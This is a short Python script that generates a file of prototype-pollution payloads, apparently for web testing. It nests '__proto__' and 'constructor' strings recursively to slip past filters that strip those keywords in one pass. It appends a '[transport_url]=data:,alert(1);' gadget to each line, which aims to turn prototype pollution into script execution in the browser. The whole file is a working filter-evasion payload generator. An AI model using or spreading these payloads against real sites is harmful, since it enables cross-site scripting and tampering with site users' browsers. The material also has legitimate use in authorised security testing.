import typer
evilString = "__proto__"

def main(number_of_times: int,file_output:str="payload"):
    evilString = "__proto__"
    evilString2 = "constructor"
    with open(file_output,"w") as file:
        for i in range(0,number_of_times):
            evilString = "__pro" + evilString + "to__"
            evilString += "[transport_url]=data:,alert(1);"
            file.write(evilString)
            evilString = evilString.replace("[transport_url]=data:,alert(1);","")
            file.write("\n")
        for i in range(0,number_of_times):
            evilString2 = "const"+evilString2+"ructor"
            evilString2 += "[transport_url]=data:,alert(1);"
            file.write(evilString2)
            evilString2 = evilString2.replace("[transport_url]=data:,alert(1);","")
            file.write("\n")

if __name__ == "__main__":
    typer.run(main)
